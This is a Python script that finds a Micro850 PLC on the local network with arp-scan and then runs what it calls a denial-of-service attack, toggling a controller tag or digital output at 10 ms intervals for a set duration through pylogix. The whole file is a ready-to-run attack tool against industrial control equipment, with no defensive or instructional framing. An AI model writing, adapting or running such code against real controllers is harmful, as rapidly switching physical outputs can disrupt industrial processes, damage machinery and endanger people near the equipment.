import pylogix
import time
import socket
import subprocess

# Configuration - Adjust these as needed
PLC_MODEL = "Micro850" #Or auto-detect
CONTROLLER_IP = None  #Autodetect by default
TAG_TO_OVERLOAD = "TONOFF_1.IN" #Could also use _IO_EM_DO_02, _IO_EM_DO_07, etc.
OVERLOAD_RATE = 0.01 # seconds (10ms) - Adjust as needed
DURATION = 60 # seconds - Duration of the attack

def get_plc_ip_address():
    """Attempts to discover the PLC's IP address using arp-scan.
    Requires arp-scan to be installed and run with sudo or as root.

    Returns:
        str: The IP address of the PLC if found, None otherwise.
    """
    try:
        # Run arp-scan (requires sudo or root privileges)
        result = subprocess.run(['sudo', 'arp-scan', '--interface=eth0', '--localnet'], capture_output=True, text=True, check=True)  # Replace eth0 with your network interface
        output_lines = result.stdout.splitlines()

        # Parse the output for the PLC's IP address
        for line in output_lines:
            if PLC_MODEL in line: # Check if the PLC model is in the ARP scan output
                parts = line.split()
                if len(parts) > 1:
                    return parts[0]  # The first part is the IP address
        return None

    except FileNotFoundError:
        print("Error: arp-scan is not installed.  Please install it (e.g., `sudo apt install arp-scan`).")
        return None
    except subprocess.CalledProcessError as e:
        print(f"Error running arp-scan: {e}")
        return None


def dos_attack(ip_address, tag_name, rate, duration):
    """Performs a denial-of-service attack by rapidly toggling a PLC tag.

    Args:
        ip_address (str): The IP address of the PLC.
        tag_name (str): The name of the tag to overload.
        rate (float): The rate at which to toggle the tag (in seconds).  Lower is faster.
        duration (int): The duration of the attack (in seconds).
    """
    try:
        with pylogix.PLC() as comm:
            comm.IPAddress = ip_address
            comm.ProcessorSlot = 0 #Default slot, change if needed

            start_time = time.time()
            while time.time() - start_time < duration:
                # Toggle the tag value
                status = comm.Write(tag_name, True)  #Set to true
                if status.Status != 'Success':
                    print(f"Write failed (TRUE): {status.Status}")
                    break #Exit if write fails.  Crucial for stability

                time.sleep(rate / 2)  # Half the rate for on time

                status = comm.Write(tag_name, False)  #Set to false
                if status.Status != 'Success':
                    print(f"Write failed (FALSE): {status.Status}")
                    break #Exit if write fails

                time.sleep(rate / 2)  # Half the rate for off time

            print(f"DoS attack completed on {tag_name}.")


    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    if CONTROLLER_IP is None:
        print("Attempting to auto-detect PLC IP address...")
        CONTROLLER_IP = get_plc_ip_address()
        if CONTROLLER_IP:
            print(f"PLC IP address found: {CONTROLLER_IP}")
        else:
            print("Failed to auto-detect PLC IP address.  Please specify it manually in the script.")
            exit(1)

    print(f"Starting DoS attack on PLC at {CONTROLLER_IP}, tag {TAG_TO_OVERLOAD}, rate {OVERLOAD_RATE}s, duration {DURATION}s")
    dos_attack(CONTROLLER_IP, TAG_TO_OVERLOAD, OVERLOAD_RATE, DURATION)
    print("Script completed.")